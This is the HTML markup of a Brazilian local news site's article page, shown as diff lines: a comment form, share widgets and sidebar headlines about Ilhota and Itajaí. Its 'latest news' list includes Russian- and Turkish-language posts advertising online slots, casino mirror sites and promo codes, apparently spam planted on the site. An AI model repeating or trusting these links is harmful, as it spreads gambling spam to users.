+		<h3 id="reply-title" class="comment-reply-title">Deixe um comentário <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2024/03/02/casos-de-dengue-em-gestantes-aumentam-345-em-2024/#respond" style="display:none;">Cancelar resposta</a></small></h3><form action="https://correiodovale.com.br/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate=""><div class="cmm-box-right"><div class="control-group"><div class="controls"><textarea id="comment" name="comment" placeholder="Comment *" cols="45" rows="8" aria-required="true"></textarea></div></div></div><div class="cmm-box-left"><div class="control-group"><div class="controls"><input id="author" placeholder="Name *" name="author" type="text" value="" size="30" aria-required="true"></div></div>
+<div class="control-group"><div class="controls"><input id="email" placeholder="Email Address *" name="email" type="text" value="" size="30" aria-required="true"></div></div>
+<div class="control-group"><div class="controls"><input id="url" name="url" placeholder="Website" type="text" value="" size="30"> </div></div></div><div class="clearfix"></div>
+<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes"> <label for="wp-comment-cookies-consent">Guardar o meu nome, email e site neste navegador para a próxima vez que eu comentar.</label></p>
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Publicar comentário"> <input type="hidden" name="comment_post_ID" value="5055" id="comment_post_ID">
+<input type="hidden" name="comment_parent" id="comment_parent" value="0">
+</p><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>Δ<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="26"><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
+	
+</div><!-- #comments -->
+		
+		</main><!-- #main -->
+	</div><!-- #primary -->
+
+
+<div id="secondary-right-sidebar" class="widget-area" role="complementary">
+	<div id="secondary" class="secondary-wrapper">
+		<aside id="block-8" class="widget widget_block">
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
+<div class="wp-block-columns is-layout-flex wp-container-core-columns-is-layout-1 wp-block-columns-is-layout-flex">
+<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow"><div class="widget sfsi">		<div class="sfsi_widget" data-position="widget" style="display:flex;flex-wrap:wrap;justify-content: left">
+			<div id="sfsi_wDiv"></div>
+			<div class="norm_row sfsi_wDiv " style="width:225px;position:absolute;;text-align:left"><div style="width:40px; height:40px;margin-left:5px;margin-bottom:30px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="" target="_blank" rel="noopener" href="https://www.facebook.com/correiodovaledoitajai" id="sfsiid_facebook_icon" style="width:40px;height:40px;opacity:1;"><img data-pin-nopin="true" alt="Facebook" title="Facebook" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/default/default_facebook.png" width="40" height="40" style="" class="sfcm sfsi_wicon " data-effect=""></a><span class="bot_no ">21k</span><div class="sfsi_tool_tip_2 fb_tool_bdr sfsiTlleft" style="opacity:0;z-index:-1;" id="sfsiid_facebook"><span class="bot_arow bot_fb_arow"></span><div class="sfsi_inside"><div class="icon3"><a target="_blank" rel="noopener" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcorreiodovale.com.br%2F2024%2F03%2F02%2Fcasos-de-dengue-em-gestantes-aumentam-345-em-2024" style="display:inline-block;"> <img class="sfsi_wicon" data-pin-nopin="true" alt="fb-share-icon" title="Facebook Share" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/share_icons/fb_icons/pt_PT.svg"></a></div></div></div></div></div><div style="width:40px; height:40px;margin-left:5px;margin-bottom:30px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="" target="_blank" rel="noopener" href="https://twitter.com/CorreiodoItajai" id="sfsiid_twitter_icon" style="width:40px;height:40px;opacity:1;"><img data-pin-nopin="true" alt="Twitter" title="Twitter" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/default/default_twitter.png" width="40" height="40" style="" class="sfcm sfsi_wicon " data-effect=""></a><div class="sfsi_tool_tip_2 twt_tool_bdr sfsiTlleft" style="opacity:0;z-index:-1;" id="sfsiid_twitter"><span class="bot_arow bot_twt_arow"></span><div class="sfsi_inside"><div class="cstmicon1"><a href="https://twitter.com/CorreiodoItajai" target="_blank" rel="noopener"><img data-pin-nopin="true" class="sfsi_wicon" alt="Visit Us" title="Visit Us" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/visit_icons/Visit_us_twitter/icon_Visit_us_pt_PT.png"></a></div><div class="icon1"><a target="_blank" href="https://twitter.com/intent/user?screen_name=CorreiodoItajai">
+			<img decoding="async" data-pin-nopin="true" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/share_icons/Twitter_Follow/pt_PT_Follow.svg" class="sfsi_wicon" alt="Follow Me" title="Follow Me" style="opacity: 1;">
+			</a></div><div class="icon2"><div class="sf_twiter" style="display: inline-block;vertical-align: middle;width: auto;">
+						<a target="_blank" rel="noopener" href="https://twitter.com/intent/tweet?text=Oi+achei+essa+mat%C3%A9ria+bem+legal%2C+veja%3A+https%3A%2F%2Fcorreiodovale.com.br%2F2024%2F03%2F02%2Fcasos-de-dengue-em-gestantes-aumentam-345-em-2024" style="display:inline-block">
+							<img data-pin-nopin="true" class="sfsi_wicon" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/share_icons/Twitter_Tweet/pt_PT_Tweet.svg" alt="Post on X" title="Post on X">
+						</a>
+					</div></div></div></div></div></div><div style="width:40px; height:40px;margin-left:5px;margin-bottom:30px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="" target="_blank" rel="noopener" href="https://www.youtube.com/channel/UCdP7hxstHuJFGBTPm-OWRqA" id="sfsiid_youtube_icon" style="width:40px;height:40px;opacity:1;"><img data-pin-nopin="true" alt="" title="" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/default/default_youtube.png" width="40" height="40" style="" class="sfcm sfsi_wicon " data-effect=""></a></div></div><div style="width:40px; height:40px;margin-left:5px;margin-bottom:30px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="" target="_blank" rel="noopener" href="https://www.instagram.com/correiodovale_" id="sfsiid_instagram_icon" style="width:40px;height:40px;opacity:1;"><img data-pin-nopin="true" alt="" title="" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/default/default_instagram.png" width="40" height="40" style="" class="sfcm sfsi_wicon " data-effect=""></a><span class="bot_no ">2k</span></div></div><div style="width:40px; height:40px;margin-left:5px;margin-bottom:30px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="" target="_blank" rel="noopener" href="https://api.whatsapp.com/send?text=https%3A%2F%2Fcorreiodovale.com.br%2F2024%2F03%2F02%2Fcasos-de-dengue-em-gestantes-aumentam-345-em-2024%2F" id="sfsiid_whatsapp_icon" style="width:40px;height:40px;opacity:1;"><img data-pin-nopin="true" alt="" title="" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/default/default_whatsapp.png" width="40" height="40" style="" class="sfcm sfsi_wicon " data-effect=""></a></div></div></div><div id="sfsi_holder" class="sfsi_holders" style="position: relative; float: left;width:100%;z-index:-1;"></div><script>window.addEventListener("sfsi_functions_loaded", function()
+			{
+				if (typeof sfsi_widget_set == "function") {
+					sfsi_widget_set();
+				}
+			}); </script>			<div style="clear: both;"></div>
+		</div>
+	</div></div>
+</div>
+</div></div>
+</aside><aside id="block-14" class="widget widget_block widget_search"><form role="search" method="get" action="https://correiodovale.com.br/" class="wp-block-search__no-button wp-block-search"><label class="wp-block-search__label" for="wp-block-search__input-1">Pesquisar no site:</label><div class="wp-block-search__inside-wrapper "><input class="wp-block-search__input" id="wp-block-search__input-1" placeholder="" value="" type="search" name="s" required=""></div></form></aside><aside id="block-39" class="widget widget_block widget_media_image"><div class="wp-block-image">
+<figure class="aligncenter size-full is-resized"><img loading="lazy" decoding="async" width="502" height="502" src="https://correiodovale.com.br/wp-content/uploads/2024/04/banner_hamburguera.gif" alt="" class="wp-image-5210" style="aspect-ratio:1;width:482px;height:auto"></figure></div></aside><aside id="media_video-3" class="widget widget_media_video"><h4 class="widget-title"><span>INFORME PUBLICITÁRIO</span></h4><div style="width:100%;" class="wp-video"><!--[if lt IE 9]><script>document.createElement('video');</script><![endif]-->
+<video class="wp-video-shortcode" id="video-5055-1" preload="metadata" controls="controls"><source type="video/youtube" src="https://www.youtube.com/watch?v=pz1SJGMlYJY&amp;t=16s&amp;_=1"><a href="https://www.youtube.com/watch?v=pz1SJGMlYJY&amp;t=16s">https://www.youtube.com/watch?v=pz1SJGMlYJY&amp;t=16s</a></video></div></aside><aside id="media_video-7" class="widget widget_media_video"><h4 class="widget-title"><span>ENTREVISTA APAE 20 ANOS</span></h4><div style="width:100%;" class="wp-video"><video class="wp-video-shortcode" id="video-5055-2" preload="metadata" controls="controls"><source type="video/youtube" src="https://youtu.be/zMXGIpT3nRc?_=2"><a href="https://youtu.be/zMXGIpT3nRc">https://youtu.be/zMXGIpT3nRc</a></video></div></aside><aside id="apmag_featured_category-4" class="widget widget_apmag_featured_category">        <div class="featured-category-wrapper">
+            <h1 class="widget-title"><span>DESTAQUES ILHOTA</span></h1>
+            <div class="content-wrapper">
+                                    <div class="single_post clearfix first-post non-zoomin">                        
+                        <div class="post-image">
+                            <a href="https://correiodovale.com.br/2024/10/14/confraternizacao-de-dia-das-criancas-movimenta-o-loteamento-primavera/" title="Confraternização de Dia das Crianças movimenta o Loteamento Primavera">
+                                                                    <img src="https://correiodovale.com.br/wp-content/uploads/2024/10/dia-das-crianas-bairro-primavera-554x305.jpg" alt="">
+                                                            </a>
+                             <a class="big-image-overlay" href="https://correiodovale.com.br/2024/10/14/confraternizacao-de-dia-das-criancas-movimenta-o-loteamento-primavera/" title="Confraternização de Dia das Crianças movimenta o Loteamento Primavera"><i class="fa fa-external-link"></i></a>                                                    </div><!-- .post-image -->
+                                                    <h4 class="post-title"><a href="https://correiodovale.com.br/2024/10/14/confraternizacao-de-dia-das-criancas-movimenta-o-loteamento-primavera/">Confraternização de Dia das Crianças movimenta o Loteamento Primavera</a></h4>
+                            <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2024/10/14/confraternizacao-de-dia-das-criancas-movimenta-o-loteamento-primavera/" rel="bookmark"><time class="entry-date published" datetime="2024-10-14T14:10:38+00:00">Outubro 14, 2024</time><time class="updated" datetime="2024-10-14T14:11:19+00:00">Outubro 14, 2024</time></a></span></div>
+                            <div class="ratings-wrapper"></div>
+                            <div class="post-content"><p>
+
+
+
+
+No último dia 12 de outubro de 2024, o Loteamento Primavera foi palco de mais uma edição da confraternização do Dia das Crianças, organizada pelo quarto ano consecutivo por Dário</p></div>                    </div><!-- .single_post -->
+                                    <div class="single_post clearfix ">                        
+                        <div class="post-image">
+                            <a href="https://correiodovale.com.br/2024/10/09/pesquisa-popular-revela-que-joel-soares-enfrentara-ceticismo-e-desafios-em-seu-primeiro-mandato-como-prefeito-de-ilhota/" title="Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota">
+                                                                    <img src="https://correiodovale.com.br/wp-content/uploads/2024/10/capa-joel-soares-540x360.png" alt="">
+                                                            </a>
+                                                                                </div><!-- .post-image -->
+                        <div class="post-desc-wrapper">                            <h4 class="post-title"><a href="https://correiodovale.com.br/2024/10/09/pesquisa-popular-revela-que-joel-soares-enfrentara-ceticismo-e-desafios-em-seu-primeiro-mandato-como-prefeito-de-ilhota/">Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota</a></h4>
+                            <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2024/10/09/pesquisa-popular-revela-que-joel-soares-enfrentara-ceticismo-e-desafios-em-seu-primeiro-mandato-como-prefeito-de-ilhota/" rel="bookmark"><time class="entry-date published" datetime="2024-10-09T16:38:45+00:00">Outubro 9, 2024</time><time class="updated" datetime="2024-10-09T17:44:18+00:00">Outubro 9, 2024</time></a></span></div>
+                            <div class="ratings-wrapper"></div>
+                            </div>                    </div><!-- .single_post -->
+                                    <div class="single_post clearfix ">                        
+                        <div class="post-image">
+                            <a href="https://correiodovale.com.br/2024/10/08/ilhota-no-podio-dos-campeoes-de-mandato/" title="Ilhota no Pódio dos Campeões de Mandato">
+                                                                    <img src="https://correiodovale.com.br/wp-content/uploads/2024/10/podio-dos-vereadores-campeoes-540x360.png" alt="Ilhota no Pódio dos Campeões de Mandato">
+                                                            </a>
+                                                                                </div><!-- .post-image -->
+                        <div class="post-desc-wrapper">                            <h4 class="post-title"><a href="https://correiodovale.com.br/2024/10/08/ilhota-no-podio-dos-campeoes-de-mandato/">Ilhota no Pódio dos Campeões de Mandato</a></h4>
+                            <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2024/10/08/ilhota-no-podio-dos-campeoes-de-mandato/" rel="bookmark"><time class="entry-date published" datetime="2024-10-08T23:57:05+00:00">Outubro 8, 2024</time><time class="updated" datetime="2024-10-09T00:20:29+00:00">Outubro 9, 2024</time></a></span></div>
+                            <div class="ratings-wrapper"></div>
+                            </div>                    </div><!-- .single_post -->
+                    
+            </div><!-- .content-wrapper -->
+        </div><!-- .featured-category-wrapper -->
+</aside><aside id="apmag_featured_category-1" class="widget widget_apmag_featured_category">        <div class="featured-category-wrapper">
+            <h1 class="widget-title"><span>ÚLTIMAS NOTICIAS ITAJAÍ</span></h1>
+            <div class="content-wrapper">
+                                    <div class="single_post clearfix first-post non-zoomin">                        
+                        <div class="post-image">
+                            <a href="https://correiodovale.com.br/2024/08/21/univali-traz-leila-pinheiro-ao-26o-festival-de-musica-de-itajai/" title="Univali traz Leila Pinheiro ao 26º Festival de Música de Itajaí">
+                                                                    <img src="https://correiodovale.com.br/wp-content/uploads/2024/08/leila-pinheiro-554x305.jpg" alt="">
+                                                            </a>
+                             <a class="big-image-overlay" href="https://correiodovale.com.br/2024/08/21/univali-traz-leila-pinheiro-ao-26o-festival-de-musica-de-itajai/" title="Univali traz Leila Pinheiro ao 26º Festival de Música de Itajaí"><i class="fa fa-external-link"></i></a>                                                    </div><!-- .post-image -->
+                                                    <h4 class="post-title"><a href="https://correiodovale.com.br/2024/08/21/univali-traz-leila-pinheiro-ao-26o-festival-de-musica-de-itajai/">Univali traz Leila Pinheiro ao 26º Festival de Música de Itajaí</a></h4>
+                            <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2024/08/21/univali-traz-leila-pinheiro-ao-26o-festival-de-musica-de-itajai/" rel="bookmark"><time class="entry-date published" datetime="2024-08-21T14:15:05+00:00">Agosto 21, 2024</time><time class="updated" datetime="2024-08-22T15:56:33+00:00">Agosto 22, 2024</time></a></span></div>
+                            <div class="ratings-wrapper"></div>
+                            <div class="post-content"><p>
+Show é um presente da instituição ao município para marcar os 60 anos de ensino superior em Itajaí
+
+
+
+A Universidade do Vale do Itajaí (Univali) irá trazer a cantora Leila Pinheiro</p></div>                    </div><!-- .single_post -->
+                                    <div class="single_post clearfix ">                        
+                        <div class="post-image">
+                            <a href="https://correiodovale.com.br/2024/03/07/tragedia-na-rodovia-jorge-lacerda-menina-de-12-anos-e-atropelada-e-nao-sobrevive/" title="Tragédia na Rodovia Jorge Lacerda: Menina de 12 anos é atropelada e não sobrevive">
+                                                                    <img src="https://correiodovale.com.br/wp-content/uploads/2024/03/Imagem-do-WhatsApp-de-2024-03-07-as-17.24.00_0c8255ce-540x360.jpg" alt="">
+                                                            </a>
+                                                                                </div><!-- .post-image -->
+                        <div class="post-desc-wrapper">                            <h4 class="post-title"><a href="https://correiodovale.com.br/2024/03/07/tragedia-na-rodovia-jorge-lacerda-menina-de-12-anos-e-atropelada-e-nao-sobrevive/">Tragédia na Rodovia Jorge Lacerda: Menina de 12 anos é atropelada e não sobrevive</a></h4>
+                            <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2024/03/07/tragedia-na-rodovia-jorge-lacerda-menina-de-12-anos-e-atropelada-e-nao-sobrevive/" rel="bookmark"><time class="entry-date published" datetime="2024-03-07T22:27:29+00:00">Março 7, 2024</time><time class="updated" datetime="2024-03-07T22:27:31+00:00">Março 7, 2024</time></a></span></div>
+                            <div class="ratings-wrapper"></div>
+                            </div>                    </div><!-- .single_post -->
+                                    <div class="single_post clearfix ">                        
+                        <div class="post-image">
+                            <a href="https://correiodovale.com.br/2023/11/13/aquecimento-para-natal-encanto-em-itajai/" title="Aquecimento para Natal encanto em Itajai">
+                                                                    <img src="https://correiodovale.com.br/wp-content/uploads/2023/11/WhatsApp-Image-2023-11-13-at-07.11.44-540x360.jpeg" alt="">
+                                                            </a>
+                                                                                </div><!-- .post-image -->
+                        <div class="post-desc-wrapper">                            <h4 class="post-title"><a href="https://correiodovale.com.br/2023/11/13/aquecimento-para-natal-encanto-em-itajai/">Aquecimento para Natal encanto em Itajai</a></h4>
+                            <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2023/11/13/aquecimento-para-natal-encanto-em-itajai/" rel="bookmark"><time class="entry-date published" datetime="2023-11-13T10:29:04+00:00">Novembro 13, 2023</time><time class="updated" datetime="2023-11-13T10:29:06+00:00">Novembro 13, 2023</time></a></span></div>
+                            <div class="ratings-wrapper"></div>
+                            </div>                    </div><!-- .single_post -->
+                    
+            </div><!-- .content-wrapper -->
+        </div><!-- .featured-category-wrapper -->
+</aside><aside id="media_video-5" class="widget widget_media_video"><h4 class="widget-title"><span>EMPRESAS &amp; NEGOCIOS</span></h4><div style="width:100%;" class="wp-video"><video class="wp-video-shortcode" id="video-4888-3" preload="metadata" controls="controls"><source type="video/youtube" src="https://www.youtube.com/watch?v=kyDZaIG8qh4&amp;_=3"><a href="https://www.youtube.com/watch?v=kyDZaIG8qh4">https://www.youtube.com/watch?v=kyDZaIG8qh4</a></video></div></aside><aside id="media_gallery-3" class="widget widget_media_gallery"><h4 class="widget-title"><span>IMAGENS DA SEMANA</span></h4><div id="gallery-1" class="gallery galleryid-4888 gallery-columns-3 gallery-size-thumbnail"><figure class="gallery-item">
+			<div class="gallery-icon landscape">
+				<a href="https://correiodovale.com.br/2023/04/05/tragedia-na-creche-quatro-criancas-mortas-em-ataque-violento-com-machadinha-em-blumenau/creche-invadida/"><img width="150" height="150" src="https://correiodovale.com.br/wp-content/uploads/2023/04/creche-invadida-150x150.png" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" loading="lazy" srcset="https://correiodovale.com.br/wp-content/uploads/2023/04/creche-invadida-150x150.png 150w, https://correiodovale.com.br/wp-content/uploads/2023/04/creche-invadida-100x100.png 100w" sizes="auto, (max-width: 150px) 100vw, 150px"></a>
+			</div></figure><figure class="gallery-item">
+			<div class="gallery-icon landscape">
+				<a href="https://correiodovale.com.br/2023/03/29/elon-musk-e-um-grupo-de-lideres-de-inteligencia-artificial-pedem-uma-pausa-na-tecnologia-de-i-a/inteligencia-artificial/"><img width="150" height="150" src="https://correiodovale.com.br/wp-content/uploads/2023/03/inteligencia-artificial-150x150.png" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" loading="lazy" srcset="https://correiodovale.com.br/wp-content/uploads/2023/03/inteligencia-artificial-150x150.png 150w, https://correiodovale.com.br/wp-content/uploads/2023/03/inteligencia-artificial-100x100.png 100w" sizes="auto, (max-width: 150px) 100vw, 150px"></a>
+			</div></figure><figure class="gallery-item">
+			<div class="gallery-icon landscape">
+				<a href="https://correiodovale.com.br/2015/10/06/sequestro-relampago-causa-panico-em-ilhota/sequestro-relampado/"><img width="150" height="150" src="https://correiodovale.com.br/wp-content/uploads/2015/10/sequestro-relampado-150x150.png" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" loading="lazy" srcset="https://correiodovale.com.br/wp-content/uploads/2015/10/sequestro-relampado-150x150.png 150w, https://correiodovale.com.br/wp-content/uploads/2015/10/sequestro-relampado-100x100.png 100w" sizes="auto, (max-width: 150px) 100vw, 150px"></a>
+			</div></figure><figure class="gallery-item">
+			<div class="gallery-icon landscape">
+				<a href="https://correiodovale.com.br/2023/03/27/prefeitura-de-ilhota-convida-moradores-para-discutir-estudos-socioambientais-na-area-central/camara-vereadores-ilhota-2/"><img width="150" height="150" src="https://correiodovale.com.br/wp-content/uploads/2023/03/camara-vereadores-ilhota-150x150.jpg" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" loading="lazy" srcset="https://correiodovale.com.br/wp-content/uploads/2023/03/camara-vereadores-ilhota-150x150.jpg 150w, https://correiodovale.com.br/wp-content/uploads/2023/03/camara-vereadores-ilhota-100x100.jpg 100w" sizes="auto, (max-width: 150px) 100vw, 150px"></a>
+			</div></figure><figure class="gallery-item">
+			<div class="gallery-icon landscape">
+				<a href="https://correiodovale.com.br/2023/03/20/perdeu-o-controle-e-bateu-no-muro/carro-bate-no-muro/"><img width="150" height="150" src="https://correiodovale.com.br/wp-content/uploads/2023/03/carro-bate-no-muro-150x150.png" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" loading="lazy" srcset="https://correiodovale.com.br/wp-content/uploads/2023/03/carro-bate-no-muro-150x150.png 150w, https://correiodovale.com.br/wp-content/uploads/2023/03/carro-bate-no-muro-100x100.png 100w" sizes="auto, (max-width: 150px) 100vw, 150px"></a>
+			</div></figure><figure class="gallery-item">
+			<div class="gallery-icon landscape">
+				<a href="https://correiodovale.com.br/2023/02/01/mutirao-de-empregos-oferece-mais-de-260-oportunidades-para-contratacao-imediata/attachment/132299/"><img width="150" height="150" src="https://correiodovale.com.br/wp-content/uploads/2023/02/132299-150x150.jpg" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" loading="lazy" srcset="https://correiodovale.com.br/wp-content/uploads/2023/02/132299-150x150.jpg 150w, https://correiodovale.com.br/wp-content/uploads/2023/02/132299-100x100.jpg 100w" sizes="auto, (max-width: 150px) 100vw, 150px"></a>
+			</div></figure><figure class="gallery-item">
+			<div class="gallery-icon landscape">
+				<a href="https://correiodovale.com.br/2023/02/03/acidente-nas-minas/aciente-minas/"><img width="150" height="150" src="https://correiodovale.com.br/wp-content/uploads/2023/02/aciente-minas-150x150.jpg" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" loading="lazy" srcset="https://correiodovale.com.br/wp-content/uploads/2023/02/aciente-minas-150x150.jpg 150w, https://correiodovale.com.br/wp-content/uploads/2023/02/aciente-minas-100x100.jpg 100w" sizes="auto, (max-width: 150px) 100vw, 150px"></a>
+			</div></figure><figure class="gallery-item">
+			<div class="gallery-icon landscape">
+				<a href="https://correiodovale.com.br/2023/01/30/municipio-de-itajai-realiza-uma-das-maiores-abordagem-e-atendimento-as-pessoas-em-situacao-de-rua/attachment/132230/"><img width="150" height="150" src="https://correiodovale.com.br/wp-content/uploads/2023/01/132230-150x150.jpg" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" loading="lazy" srcset="https://correiodovale.com.br/wp-content/uploads/2023/01/132230-150x150.jpg 150w, https://correiodovale.com.br/wp-content/uploads/2023/01/132230-100x100.jpg 100w" sizes="auto, (max-width: 150px) 100vw, 150px"></a>
+			</div></figure><figure class="gallery-item">
+			<div class="gallery-icon landscape">
+				<a href="https://correiodovale.com.br/2023/01/31/empresario-ilhotense-perde-tudo-em-incendio/whatsapp-image-2023-01-28-at-15-58-22-2/"><img width="150" height="150" src="https://correiodovale.com.br/wp-content/uploads/2023/01/WhatsApp-Image-2023-01-28-at-15.58.22-1-150x150.jpeg" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" loading="lazy" srcset="https://correiodovale.com.br/wp-content/uploads/2023/01/WhatsApp-Image-2023-01-28-at-15.58.22-1-150x150.jpeg 150w, https://correiodovale.com.br/wp-content/uploads/2023/01/WhatsApp-Image-2023-01-28-at-15.58.22-1-100x100.jpeg 100w" sizes="auto, (max-width: 150px) 100vw, 150px"></a>
+			</div></figure>
+		</div>
+</aside><aside id="apmag_register_latest_posts-5" class="widget widget_apmag_register_latest_posts">        <div class="latest-posts clearfix">
+            <h1 class="widget-title"><span>ÚLTIMAS NOTICIAS</span></h1>     
+            <div class="latest-posts-wrapper">
+                                    <div class="latest-single-post clearfix">
+                        <div class="post-img"><a href="https://correiodovale.com.br/2025/01/10/%d0%b8%d0%b3%d1%80%d0%be%d0%b2%d1%8b%d0%b5-%d0%b0%d0%b2%d1%82%d0%be%d0%bc%d0%b0%d1%82%d1%8b-%d0%bd%d0%b0-%d0%be%d1%84%d0%b8%d1%86%d0%b8%d0%b0%d0%bb%d1%8c%d0%bd%d0%be%d0%bc-%d1%81%d0%b0%d0%b9%d1%82/" title="игровые автоматы на официальном сайте, войти на рабочее зеркало, играть онлайн на деньги или в демо режиме">
+                                                        <img src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/images/no-image-small.jpg" alt="No image">                            
+                                                    </a></div><!-- .post-img -->
+                        <div class="post-desc-wrapper">
+                            <h4 class="post-title"><a href="https://correiodovale.com.br/2025/01/10/%d0%b8%d0%b3%d1%80%d0%be%d0%b2%d1%8b%d0%b5-%d0%b0%d0%b2%d1%82%d0%be%d0%bc%d0%b0%d1%82%d1%8b-%d0%bd%d0%b0-%d0%be%d1%84%d0%b8%d1%86%d0%b8%d0%b0%d0%bb%d1%8c%d0%bd%d0%be%d0%bc-%d1%81%d0%b0%d0%b9%d1%82/">игровые автоматы на официальном сайте, войти на рабочее зеркало, играть онлайн на деньги или в демо режиме</a></h4>
+                            <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2025/01/10/%d0%b8%d0%b3%d1%80%d0%be%d0%b2%d1%8b%d0%b5-%d0%b0%d0%b2%d1%82%d0%be%d0%bc%d0%b0%d1%82%d1%8b-%d0%bd%d0%b0-%d0%be%d1%84%d0%b8%d1%86%d0%b8%d0%b0%d0%bb%d1%8c%d0%bd%d0%be%d0%bc-%d1%81%d0%b0%d0%b9%d1%82/" rel="bookmark"><time class="entry-date published updated" datetime="2025-01-10T16:25:23+00:00">Janeiro 10, 2025</time></a></span></div>
+                        </div><!-- .post-desc-wrapper -->
+                    </div><!-- .latest-single-post -->
+                                    <div class="latest-single-post clearfix">
+                        <div class="post-img"><a href="https://correiodovale.com.br/2025/01/08/gates-of-olympus-slot-machine-ucretsiz-oyna-bonuslar-kazanclar/" title="Gates of Olympus Slot Machine: Ücretsiz Oyna, Bonuslar, Kazançlar">
+                                                        <img src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/images/no-image-small.jpg" alt="No image">                            
+                                                    </a></div><!-- .post-img -->
+                        <div class="post-desc-wrapper">
+                            <h4 class="post-title"><a href="https://correiodovale.com.br/2025/01/08/gates-of-olympus-slot-machine-ucretsiz-oyna-bonuslar-kazanclar/">Gates of Olympus Slot Machine: Ücretsiz Oyna, Bonuslar, Kazançlar</a></h4>
+                            <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2025/01/08/gates-of-olympus-slot-machine-ucretsiz-oyna-bonuslar-kazanclar/" rel="bookmark"><time class="entry-date published updated" datetime="2025-01-08T15:06:51+00:00">Janeiro 8, 2025</time></a></span></div>
+                        </div><!-- .post-desc-wrapper -->
+                    </div><!-- .latest-single-post -->
+                                    <div class="latest-single-post clearfix">
+                        <div class="post-img"><a href="https://correiodovale.com.br/2024/12/25/%d0%bf%d1%80%d0%be%d0%bc%d0%be%d0%ba%d0%be%d0%b4%d1%8b-%d0%b4%d0%bb%d1%8f-%d0%b2%d0%b0%d0%b2%d0%b0%d0%b4%d0%b0-%d0%bd%d0%b0-%d1%81%d0%b5%d0%b3%d0%be%d0%b4%d0%bd%d1%8f-%d1%81%d0%b2%d0%b5%d0%b6%d0%b8/" title="Промокоды для Вавада на сегодня свежие коды 2024 на бездепозитные бонусы, купоны на день рождения">
+                                                        <img src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/images/no-image-small.jpg" alt="No image">                            
+                                                    </a></div><!-- .post-img -->
+                        <div class="post-desc-wrapper">
+                            <h4 class="post-title"><a href="https://correiodovale.com.br/2024/12/25/%d0%bf%d1%80%d0%be%d0%bc%d0%be%d0%ba%d0%be%d0%b4%d1%8b-%d0%b4%d0%bb%d1%8f-%d0%b2%d0%b0%d0%b2%d0%b0%d0%b4%d0%b0-%d0%bd%d0%b0-%d1%81%d0%b5%d0%b3%d0%be%d0%b4%d0%bd%d1%8f-%d1%81%d0%b2%d0%b5%d0%b6%d0%b8/">Промокоды для Вавада на сегодня свежие коды 2024 на бездепозитные бонусы, купоны на день рождения</a></h4>
+                            <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2024/12/25/%d0%bf%d1%80%d0%be%d0%bc%d0%be%d0%ba%d0%be%d0%b4%d1%8b-%d0%b4%d0%bb%d1%8f-%d0%b2%d0%b0%d0%b2%d0%b0%d0%b4%d0%b0-%d0%bd%d0%b0-%d1%81%d0%b5%d0%b3%d0%be%d0%b4%d0%bd%d1%8f-%d1%81%d0%b2%d0%b5%d0%b6%d0%b8/" rel="bookmark"><time class="entry-date published updated" datetime="2024-12-25T08:45:53+00:00">Dezembro 25, 2024</time></a></span></div>
+                        </div><!-- .post-desc-wrapper -->
+                    </div><!-- .latest-single-post -->
+                                    <div class="latest-single-post clearfix">
